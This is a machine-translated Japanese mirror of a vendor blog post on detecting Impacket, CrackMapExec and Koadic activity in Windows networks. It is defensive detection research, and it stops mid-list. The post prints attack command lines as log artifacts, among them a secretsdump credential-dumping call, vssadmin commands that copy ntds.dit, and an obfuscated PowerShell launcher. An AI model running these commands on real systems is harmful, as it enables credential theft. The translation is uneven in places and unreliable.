<!doctype html>
<html class="no-js" lang="ja">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>👩🏼‍🏫 ☣️ 🧛🏻 Windowsインフラストラクチャへの攻撃を検出する方法：ハッカーツールの探索 👩‍👩‍👦 👩🏾‍🚀 🗼</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="企業部門における攻撃の数は毎年増加しています。たとえば、2017年には2016年よりも13％多くのユニークインシデントが記録され、2018年末までに、前の期間より27％多くのインシデントが記録されました。主な作業ツールがWindowsオペレーティングシステムであるものを含みます。 2017年から20...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>Windowsインフラストラクチャへの攻撃を検出する方法：ハッカーツールの探索</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/pt/blog/460517/"><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><img src="https://habrastorage.org/webt/qm/kv/ra/qmkvra9qmrta93tfbev2d6pdm7k.png"></a><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
企業部門における攻撃の数は毎年増加しています。たとえば、</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2017年に</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">は2016年よりも</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;">13％多くのユニークインシデントが記録さ</font></a><font style="vertical-align: inherit;">れ、2018年末まで</font><font style="vertical-align: inherit;">に、前の期間より</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">27％多くのインシデント</font></font></a><font style="vertical-align: inherit;"><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;">が記録され</font></a><font style="vertical-align: inherit;">ました。主な作業ツールがWindowsオペレーティングシステムであるものを含みます。 2017年から2018年にかけて、APTトンボ、APT28、</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">APTマディウォーターグループ</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">は、ヨーロッパ、北米、サウジアラビアの政府および軍事組織を攻撃しました。そして、このために3つのツールを使用しました</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-Impacket</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CrackMapExec</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Koadic</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。彼らのソースコードはオープンで、GitHubで入手できます。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
これらのツールは最初の侵入ではなく、インフラストラクチャ内での攻撃の開発に使用されることに注意してください。</font><font style="vertical-align: inherit;">攻撃者は、境界を克服した後、攻撃のさまざまな段階でそれらを使用します。</font><font style="vertical-align: inherit;">ちなみに、これは検出が難しく、多くの場合</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、ネットワークトラフィックの侵害の痕跡</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">を</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;">検出する</font></a><font style="vertical-align: inherit;">テクノロジー</font><font style="vertical-align: inherit;">や</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、攻撃者がインフラストラクチャに侵入した後の攻撃者のアクティブなアクションを検出</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">できるツールを使用</font><font style="vertical-align: inherit;">した場合のみ</font><font style="vertical-align: inherit;">です。</font><font style="vertical-align: inherit;">ツールは、ファイルの転送からレジストリとのやり取り、リモートマシンでのコマンドの実行まで、多くの機能を提供します。</font><font style="vertical-align: inherit;">これらのツールの調査を実施して、ネットワークアクティビティを特定しました。</font></font><a name="habracut"></a><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
私たちがする必要があったこと：</font></font><br>
<br>
<ul>
<li><b>,    </b>. ,           .</li>
<li><b> ,          </b>.     ,       ,        ,      .       ,      . </li>
<li><b>     </b>.     ,               .       ,      ,  - .</li>
</ul><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
これらのツールは攻撃者に何を提供しますか？これがインパケットの場合、攻撃者は侵入後の攻撃のさまざまな段階で使用できるモジュールの大きなライブラリを取得します。 Metasploitなど、多くのツールは内部でImpacketモジュールを使用しています。リモートコマンド実行用のdcomexecとwmiexec、Impacketから追加されたメモリからアカウントを取得するためのsecretsdumpがあります。結果として、そのようなライブラリーの活性の正確な検出は、誘導体の検出も保証します。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
CrackMapExec（またはCMEのみ）について、作成者は偶然「Powered by Impacket」を書いた。</font><font style="vertical-align: inherit;">さらに、CMEには一般的なシナリオ用の既製の機能があります。これは、パスワードまたはそのハッシュを取得するためのMimikatz、リモート実行用のMeterpreterまたはEmpireエージェントの実装、およびボード上のBloodhoundです。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
私たちが選択した3番目のツールはKoadicです。</font><font style="vertical-align: inherit;">それは非常に新鮮で、2017年のDEFCON 25国際ハッカー会議で発表され、HTTP、Java Script、Microsoft Visual Basic Sc​​ript（VBS）を介した作業という非標準的なアプローチを採用しています。</font><font style="vertical-align: inherit;">このアプローチは、国外での生活と呼ばれます。このツールは、Windowsに組み込まれた一連の依存関係とライブラリを使用します。</font><font style="vertical-align: inherit;">作成者はそれをCOMコマンドコントロール、またはC3と呼びます。</font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">インパケット</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Impacketの機能は非常に幅広く、AD内の偵察から内部MS SQLサーバーからのデータ収集まで、クレデンシャルを取得するための手法で終わります。これはSMBリレー攻撃であり、ドメインコントローラーからユーザーパスワードハッシュを含むntds.ditファイルを受け取ります。</font><font style="vertical-align: inherit;">Impacketは、4つの異なる方法を使用してコマンドをリモートで実行します。WMIは、Windowsスケジューラ、DCOMおよびSMBを管理するためのサービスで、これには資格情報が必要です。</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Secretsdump</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
secretsdumpを見てみましょう。これは、ユーザーマシンとドメインコントローラーの両方を目的とするモジュールです。これを使用すると、LSA、SAM、SECURITY、NTDS.ditメモリ領域のコピーを取得できるため、攻撃のさまざまな段階で確認できます。モジュールの操作の最初のステップは、SMBを介した認証です。これには、Pass the Hash攻撃を自動的に実行するために、ユーザーパスワードまたはそのハッシュが必要です。次は、Service Control Manager（SCM）へのアクセスを開き、winregプロトコルを使用してレジストリにアクセスするためのリクエストです。これを使用して、攻撃者は興味のあるブランチのデータを見つけ、SMBを介して結果を取得できます。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
図では1 winregプロトコルを使用すると、LSAからの登録キーによってアクセスがどのように正確に取得されるかがわかります。これを行うには、オペコード15-OpenKeyでDCERPCコマンドを使用します。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/28/g3/uf/28g3ufutlahahdolf8mne9sa4q4.png"><br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">図。 1. winregプロトコルを使用してレジストリキーを開く</font></font></i><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
次に、キーによってアクセスが取得されると、SaveKeyコマンドがオペコード20で保存されます。 .tmpを追加した名前がランダムな8文字の文字列であるファイルに値を保存します。さらに、このファイルのアンロードは、System32ディレクトリからSMBを通じて行われます（図2）。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/v8/o-/56/v8o-56ycynu817pivdpr65jvtk8.png"><br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">図。 2.リモートマシンからレジストリキーを取得するためのスキーム</font></font></i><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
winregプロトコル、特定の名前、コマンド、およびそれらの順序を使用して特定のレジストリブランチをクエリすることにより、ネットワーク上のそのようなアクティビティを検出できることがわかります。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
また、このモジュールはWindowsイベントログにトレースを残すため、簡単に検出できます。</font><font style="vertical-align: inherit;">たとえば、コマンドの結果として</font></font><br>
<br>
<pre><code class="bash hljs">secretsdump.py -debug -system SYSTEM -sam SAM -ntds NTDS -security SECURITY -bootkey BOOTKEY -outputfile 1.txt -use-vss -<span class="hljs-built_in">exec</span>-method mmcexec -user-status -dc-ip 192.168.202.100 -target-ip 192.168.202.100 contoso/Administrator:@DC</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 Windows Server 2016ログに、次の主要なイベントシーケンスが表示されます</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
。1. 4624-リモートログオン。</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
2. 5145-リモートwinregサービスへのアクセス権の確認。</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
3. 5145-System32ディレクトリー内のファイル許可を検査します。</font><font style="vertical-align: inherit;">ファイルには、上記のランダムな名前が付けられています。</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
4. 4688-vssadminを起動するcmd.exeプロセスを作成します。</font></font><br>
<br>
<pre><code class="bash hljs">“C:\windows\system32\cmd.exe<span class="hljs-string">" /Q /c echo c:\windows\system32\cmd.exe /C vssadmin list shadows ^&gt; %SYSTEMROOT%\Temp\__output &gt; %TEMP%\execute.bat &amp; c:\windows\system32\cmd.exe /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat</span></code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
5. 4688-次のコマンドでプロセスを作成します：</font></font><br>
<br>
<pre><code class="bash hljs"><span class="hljs-string">"C:\windows\system32\cmd.exe"</span> /Q /c <span class="hljs-built_in">echo</span> c:\windows\system32\cmd.exe /C vssadmin create shadow /For=C: ^&gt; %SYSTEMROOT%\Temp\__output &gt; %TEMP%\execute.bat &amp; c:\windows\system32\cmd.exe /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
6. 4688-次のコマンドでプロセスを作成します。</font></font><br>
<br>
<pre><code class="bash hljs"><span class="hljs-string">"C:\windows\system32\cmd.exe"</span> /Q /c <span class="hljs-built_in">echo</span> c:\windows\system32\cmd.exe /C copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\NTDS\ntds.dit %SYSTEMROOT%\Temp\rmumAfcn.tmp ^&gt; %SYSTEMROOT%\Temp\__output &gt; %TEMP%\execute.bat &amp; c:\windows\system32\cmd.exe /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
7. 4688-次のコマンドでプロセスを作成します。</font></font><br>
<br>
<pre><code class="bash hljs"><span class="hljs-string">"C:\windows\system32\cmd.exe"</span> /Q /c <span class="hljs-built_in">echo</span> c:\windows\system32\cmd.exe /C vssadmin delete shadows /For=C: /Quiet ^&gt; %SYSTEMROOT%\Temp\__output &gt; %TEMP%\execute.bat &amp; c:\windows\system32\cmd.exe /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat</code></pre><br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">smbexec</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
操作後の多くのツールと同様に、Impacketにはリモートコマンド実行用のモジュールがあります。ここでは、リモートマシンにインタラクティブシェルを提供するsmbexecに焦点を当てます。このモジュールでは、パスワードまたはそのハッシュを使用したSMB認証も必要です。図では3このようなツールがどのように機能するかの例を示します。この場合は、ローカル管理者コンソールです。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/65/dx/os/65dxos1pwb3v9sy457qqqcasjzi.png"><br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">図。 3.対話型のsmbexecコンソール</font></font></i><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
認証後のsmbexecの最初の段階は、OpenSCManagerWコマンドを使用してSCMを開くことです（15）。リクエストは注目に値します。その中で、MachineNameフィールドはDUMMYに設定されています。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/rr/ob/go/rrobgonzydm5evu36sxa3awiw0k.png"><br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">図。 4.サービスコントロールマネージャーを開く要求</font></font></i><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
次に、CreateServiceW（12）コマンドを使用してサービスを作成します。 smbexecの場合、毎回コマンドを作成する同じロジックを見ることができます。図では5緑は変更されていないコマンドパラメータを示し、黄色は攻撃者が変更できるものを示します。実行可能ファイルの名前、そのディレクトリ、および出力ファイルは変更できますが、残りの部分は、Impacketモジュールのロジックに違反することなく、はるかに困難に変更できます。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/in/na/fo/innafo8sq7hwikto5cli9sv9-ow.png"><br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">図。 5.サービスコントロールマネージャー</font></font></i><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
Smbexec </font><i><font style="vertical-align: inherit;">を使用してサービスを作成する要求</font></i><font style="vertical-align: inherit;">も、Windowsイベントログに明らかなトレースを残します。 ipconfigコマンドを使用した対話型シェルのWindows Server 2016ログに、次の主要なイベントシーケンスが表示されます</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
。1. 4697-被害者のマシンへのサービスのインストール：</font></font><br>
<br>
<pre><code class="bash hljs">%COMSPEC% /Q /c <span class="hljs-built_in">echo</span> <span class="hljs-built_in">cd</span> ^&gt; \\127.0.0.1\C$\__output 2^&gt;^&amp;1 &gt; %TEMP%\execute.bat &amp; %COMSPEC% /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
2. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
4688- </font><font style="vertical-align: inherit;">ポイント1の引数を使用してcmd.exeプロセスを作成し</font><font style="vertical-align: inherit;">ます。3. 5145-C $ディレクトリの__outputファイルへのアクセス権を確認します。</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
4. 4697-被害者のマシンへのサービスのインストール。</font></font><br>
<br>
<pre><code class="bash hljs">%COMSPEC% /Q /c <span class="hljs-built_in">echo</span> ipconfig ^&gt; \\127.0.0.1\C$\__output 2^&gt;^&amp;1 &gt; %TEMP%\execute.bat &amp; %COMSPEC% /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
5. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
4688- </font><font style="vertical-align: inherit;">ポイント4の引数を使用してcmd.exeプロセスを作成し</font><font style="vertical-align: inherit;">ます。6. 5145-C $ディレクトリの__outputファイルへのアクセス権を確認します。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Impacketは、攻撃ツールを開発するための基盤です。</font><font style="vertical-align: inherit;">Windowsインフラストラクチャのほぼすべてのプロトコルをサポートし、同時に独自の特性を備えています。</font><font style="vertical-align: inherit;">以下は、特定のwinreg要求、およびコマンドの特徴的な形成を伴うSCM APIの使用、ファイル名の形式、およびSMB共有SYSTEM32です。</font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">クラックマップ</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
CMEツールは、主に攻撃者がネットワーク内で前進するために実行する必要がある日常的なアクションを自動化するように設計されています。</font><font style="vertical-align: inherit;">悪名高いEmpireエージェントおよびMeterpreterと連携して作業することができます。</font><font style="vertical-align: inherit;">コマンドを密かに実行するために、CMEはそれらを難読化できます。</font><font style="vertical-align: inherit;">攻撃者はBloodhound（独立したインテリジェンスツール）を使用して、アクティブなドメイン管理者セッションの検索を自動化できます。</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ブラッドハウンド</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
独立したツールとしてのBloodhoundは、ネットワーク内の高度なインテリジェンスを可能にします。ユーザー、マシン、グループ、セッションに関するデータを収集し、PowerShell上のスクリプトまたはバイナリファイルの形式で提供されます。情報の収集には、LDAPまたはSMBベースのプロトコルが使用されます。 CME統合モジュールを使用すると、被害者のマシンにBloodhoundをダウンロードし、実行後に収集したデータを実行して受信できるため、システム内のアクションを自動化して目立たなくすることができます。グラフィカルシェルのBloodhoundは、収集したデータをグラフの形式で表示します。これにより、攻撃者のマシンからドメイン管理者への最短経路を見つけることができます。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/5g/b6/xm/5gb6xmpsvew_hmxv_j_e6z89nec.png"><br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">図。 6. Bloodhoundインターフェース</font></font></i><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
被害者のマシンで実行するために、モジュールはATSVCとSMBを使用してタスクを作成します。 ATSVCは、Windowsタスクスケジューラを操作するためのインターフェイスです。 CMEは、NetrJobAdd（1）関数を使用して、ネットワーク経由でタスクを作成します。 CMEが送信する内容の例を図4に示します。 7：これは、cmd.exeへの呼び出しと、XML形式の引数としての難読化されたコードです。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/h1/ft/_t/h1ft_tmh38cii_onpk6k4dydd10.png"><br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">図7。 CMEを介したタスクの作成</font></font></i><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
タスクが到着すると、被害者のマシンがBloodhound自体を起動します。これはトラフィックで確認できます。モジュールは、標準グループ、ドメイン内のすべてのマシンとユーザーのリストを受信し、SRVSVC NetSessEnum要求を介してアクティブなユーザーセッションに関する情報を受信するためのLDAPクエリを特徴としています。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/pm/i3/5a/pmi35abw7jc1vjo-zrexijzhqks.png"><br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">図。 8. SMBを介してアクティブなセッションのリストを取得する</font></font></i><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
さらに、監査が有効になっている被害者のマシンでBloodhoundを起動すると、ID 4688（プロセスの作成）とプロセス名のイベントが発生します</font></font><code>«C:\Windows\System32\cmd.exe»</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">その中で注目すべきはコマンドライン引数です：</font></font><br>
<br>
<pre><code class="bash hljs">cmd.exe /Q /c powershell.exe -<span class="hljs-built_in">exec</span> bypass -noni -nop -w 1 -C <span class="hljs-string">" &amp; ( <span class="hljs-variable">$eNV</span>:cOmSPEc[4,26,25]-JOiN'')( [chAR[]](91 , 78, 101,116 , 46, 83 , 101 , … , 40,41 )-jOIN'' ) "</span></code></pre><br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Enum_avproducts</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
機能と実装の観点から見ると、enum_avproductsモジュールは非常に興味深いものです。 WMIでは、WQLクエリ言語を使用してさまざまなWindowsオブジェクトからデータを受信できます。これは、基本的にこのCMEモジュールが使用するものです。被害者のマシンにインストールされている保護に関するAntiSpywareProductクラスとAntiMirusProductクラスへのリクエストを生成します。必要なデータを取得するために、モジュールはroot \ SecurityCenter2名前空間に接続し、WQLクエリを生成して応答を受信します。図では図9は、このような要求と応答の内容を示しています。この例では、Windows Defenderが見つかりました。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/qs/lx/i5/qslxi5tarfkx3quxppml3vcgudm.png"><br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">図。 9. enum_avproductsモジュールのネットワークアクティビティ</font></font></i><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
多くの場合、WQLクエリに関する有用な情報を見つけることができるイベントでは、WMI監査（トレースWMI-Activity）がオフになっている場合があります。</font><font style="vertical-align: inherit;">ただし、これが有効になっている場合、enum_avproductsスクリプトが実行されると、ID 11のイベントが保存され、リクエストを送信したユーザーの名前と、ルート\ SecurityCenter2名前空間の名前が含まれます。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
特定のWQLクエリであっても、タスクスケジューラでの特定のタイプのタスクの作成であっても、CMEモジュールごとに独自のアーティファクトが明らかになり、LDAPとSMBでのBloodhoundの典型的なアクティビティと難読化が行われました。</font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">コアディック</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Koadicの特徴的な機能は、組み込みのWindowsインタープリターJavaScriptおよびVBScriptの使用です。この意味で、それは土地を離れて暮らすという傾向に従います。つまり、外部依存関係がなく、標準のWindowsツールを使用します。これは、完全なCommand＆Control（CnC）用のツールです。これは、感染後、「インプラント」がマシンにインストールされ、制御できるようになるためです。このようなマシンは、Koadic用語では「ゾンビ」と呼ばれます。被害者側で本格的な作業を行うための特権がないため、KoadicはUACバイパステクニックを使用してそれらを上げることができます。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/z7/lp/e9/z7lpe96_xft7qv9xvusq-4uzukm.png"><br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">図。 10.コマンドシェルコアディック</font></font></i><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
被害者は、Command＆Controlサーバー自体との通信を開始する必要があります。</font><font style="vertical-align: inherit;">これを行うには、事前に準備されたURIに連絡し、いずれかのステージャーを使用してメインのコアディックボディを取得する必要があります。</font><font style="vertical-align: inherit;">図では </font><font style="vertical-align: inherit;">mshtaステージャーの例を示します。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/rg/sk/fu/rgskfuogt-22hdhlrn8553hi88k.png"><br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">図。</font><font style="vertical-align: inherit;">11.</font></font></i><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
CnC </font><i><font style="vertical-align: inherit;">サーバーとのセッションの初期化</font></i><font style="vertical-align: inherit;"> WS変数</font><i><font style="vertical-align: inherit;">を使用する</font></i><font style="vertical-align: inherit;">と、実行がWScript.Shellを介して行われ、STAGER、SESSIONKEY、JOBKEY、JOBKEYPATH、EXPIRE変数に現在のセッションのパラメーターに関するキー情報が含まれていることが明らかになります。</font><font style="vertical-align: inherit;">これは、CnCサーバーへのHTTP接続における最初の要求と応答のペアです。</font><font style="vertical-align: inherit;">後続のリクエストは、呼び出されたモジュール（インプラント）の機能に直接関連しています。</font><font style="vertical-align: inherit;">すべてのKoadicモジュールは、CnCとのアクティブなセッションでのみ機能します。</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ミミカッツ</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
CMEがBloodhoundで動作するように、Koadicはスタンドアロンプ​​ログラムとしてMimikatzで動作し、いくつかの方法で実行できます。以下は、Mimikatzインプラントをロードするための要求と応答のペアです。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/d6/8m/4a/d68m4amrfwoylxnmm_o06auiucu.png"><br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">図。 12. MimikatzからKoadicへの転送</font></font></i><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
リクエストのURI形式がどのように変更されたかが</font><i><font style="vertical-align: inherit;">わかり</font></i><font style="vertical-align: inherit;">ます。選択されたモジュールを担当するcsrf変数の値が表示されます。彼女の名前には注意しないでください。 CSRFは通常異なる方法で理解されることは誰でも知っています。それに応えて、Koadicの同じ本体が登場し、Mimikatzに関連するコードが追加されました。十分な大きさなので、要点を考慮してください。私たちの前には、base64でエンコードされたMimikatzライブラリ、それを挿入するシリアル化された.NETクラス、およびMimikatzを起動するための引数があります。実行結果は平文でネットワークを介して送信されます。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/sg/ua/jx/sguajxxqyymj7sbhr3nwjism2pe.png"><br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">図。</font><font style="vertical-align: inherit;">13.リモートマシンでMimikatzを実行した結果</font></font></i><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">exec_cmd</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Koadicには、コマンドをリモートで実行できるモジュールもあります。</font><font style="vertical-align: inherit;">ここでは、URIを生成する同じ方法と、おなじみの変数sidおよびcsrfを示します。</font><font style="vertical-align: inherit;">exec_cmdモジュールの場合、シェルコマンドを実行できるコードが本体に追加されます。</font><font style="vertical-align: inherit;">次のコードは、CnCサーバーのHTTP応答に示されています。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/v7/3c/yw/v73cywsdkemyp0lsoemc0sn6ed4.png"><br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">図。</font><font style="vertical-align: inherit;">14.埋め込みコードexec_cmdコード</font></font></i><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
を実行するには、おなじみのWS属性を持つ</font><i><font style="vertical-align: inherit;">GAWTUUGCFI</font></i><font style="vertical-align: inherit;">変数が必要です。</font><font style="vertical-align: inherit;">その助けを借りて、インプラントはシェルを呼び出し、コードの2つのブランチを処理します-出力データストリームを返すshell.execと返さずにshell.run。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Koadicは典型的なツールではありませんが、正規のトラフィックで見つけることができる独自のアーティファクトがあります。</font></font><br>
<br>
<ul>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HTTPリクエストの特別な形成、</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">winHttpRequests APIを使用して、</font></font></li>
